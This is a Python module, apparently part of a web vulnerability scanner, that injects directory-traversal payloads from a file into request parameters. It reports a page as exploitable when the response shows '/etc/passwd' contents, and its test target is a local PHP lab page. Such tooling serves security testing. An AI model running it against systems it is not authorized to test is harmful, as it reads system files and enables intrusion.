import sys
import requests
import library
from bs4 import BeautifulSoup

def run(injection_obj):
  print("Running {}\n".format(injection_obj[1]))

  payloads = get_payload_list()
  inject_payloads(injection_obj, payloads)

def inject_payloads(injection_obj, payloads):
  method, link, params, cookie = injection_obj
  is_exploitable = False

  # try injection each payload into each param
  for param_idx in range(len(params)):
    for payload in payloads:
      print("Trying {} request {} with {} as param {}".format(method, link, payload, params[param_idx]))
      response = library.make_request(injection_obj, payload, param_idx)
      is_exploitable = contains_passwd(response)
      print("Exploitable with payload {}: {}\n".format(payload, is_exploitable))
      # TODO : write results into json 

      # TODO refactor this - break after finding the first successful payload
      if is_exploitable:
          break
    if is_exploitable:
        break

def get_payload_list(filename='payloads/directory_traversal_payloads.txt'):
  """Returns payloads in payload file as a list"""
  with open(filename) as f:
    payloads = f.read().splitlines()
    return payloads

def contains_passwd(response):
  """Checks if reponse constains /etc/passwd contents
  Works by checking if the response contains 'root:x:0:0:'

  Args:
    response: Requests response object

  Returns:
    boolean
  """
  # TODO: need to find out if this is the best way to check /etc/passwd got displayed\
  #       maybe just change to ':x:0:0' because the username of root user may not always be root
  #       but the uid and gid is guaranteed to be 0

  ROOT_LINE = 'root:x:0:0:'

  if response.status_code != 200:
    return False

  if ROOT_LINE in response.text:
    return True

  # TODO: in case response contains JSON use reponses.json()
  # TODO: check if necessary - maybe using .text is sufficient
  # tested with nusmods api - probably no need to use reponses.json()

  return False

# TODO for testing, remove when done
if __name__ == '__main__':
  injection_obj = ['GET','http://127.0.0.1:8888/directorytraversal/directorytraversal.php', ['ascii'], '']
  run(injection_obj)
